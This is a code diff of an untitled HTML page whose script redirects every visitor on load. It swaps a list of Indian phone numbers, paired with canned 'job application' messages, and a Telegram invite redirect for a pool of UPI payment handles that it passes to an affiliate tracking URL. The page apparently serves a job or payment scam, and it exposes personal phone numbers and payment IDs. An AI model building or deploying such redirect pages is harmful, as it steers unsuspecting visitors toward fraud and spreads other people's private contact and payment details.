@@ -4,16 +4,22 @@
   <meta charset="utf-8">
   <title></title>
   <script>
-    const data = [
-      {num:"919006420568",msg:"The job application number is: in-RUei-2268. I saw the job posting you shared on the recruitment platform, and I would like to learn more about it."},
-      {num:"918941853154",msg:"The job application number is: in-mtCd-2254. I saw the job posting you shared on the recruitment platform, and I would like to learn more about it."},
-      {num:"919651321261",msg:"The job application number is: in-4k0V-2261. I saw the job posting you shared on the recruitment platform, and I would like to learn more about it."},
-      {num:"918885501411",msg:"Hello, my job application number is: in-fbze-2311, and I would like to apply for the job you posted on the recruitment platform."},
-      {num:"918923360664",msg:"The job application number is: in-PdD2-2264. I saw the job posting you shared on the recruitment platform, and I would like to learn more about it."}
+  /* === UPI pool === */
+    const upi = [
+      "95553222078@ybl","6387804365@axl","8380070455@airtel","9555322207@airtel",
+      "shaik.junaid@ptaxis","9555322207@mbk","amanup50@fam","6387804365-2@axl",
+      "vira55557@jio","6000183692@ybl","8822442129@ybl","8155030285@ptyes",
+      "9622373364@pthdfc","7078153471@axl"
     ];
-    const pick = data[Math.floor(Math.random() * data.length)];
-    // window.location.replace("https://wa.me/" + pick.num + "?text=" + encodeURIComponent(pick.msg));
-    window.location.href = `https://t.me/+Q95coR2CNEE0ZmQ1`;
+    
+    /* === random pick === */
+    const u = upi[Math.floor(Math.random()*upi.length)];
+    const r = upi[Math.floor(Math.random()*upi.length)];
+    
+    /* === turant redirect === */
+    location.replace(
+      `http://www.mediascopy.com/track/?off_id=1486&pub_id=5598&p_sub=${encodeURIComponent(u)}&aff_id=${encodeURIComponent(r)}`
+    );
   </script>
 </head>
 </html>
